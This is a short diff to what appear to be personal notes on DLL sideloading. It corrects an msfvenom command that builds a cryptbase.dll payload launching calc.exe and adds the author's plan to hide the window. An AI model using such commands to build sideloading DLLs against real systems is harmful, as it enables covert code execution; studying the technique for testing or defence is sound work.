@@ -568,9 +568,11 @@ https://github.com/duck-sec/msfvenom-revshell-cheatsheet
 https://www.r-tec.net/r-tec-blog-dll-sideloading.html
 
 ```python
-msfvenom -f dll -p windows/x64/exec CMD="C:\\Windows\\System32\\calc.exe" -o cryptbase.dll`
+msfvenom -f dll -p windows/x64/exec CMD="C:\\Windows\\System32\\calc.exe" -o cryptbase.dll
 ```
 
-I have found this example payload that i will adapt slightly to my needs at this time!
+I have found this example command that i will adapt slightly to my needs at this time!
+
+I will use `-windowstyle hidden` as well in the command!
 
 
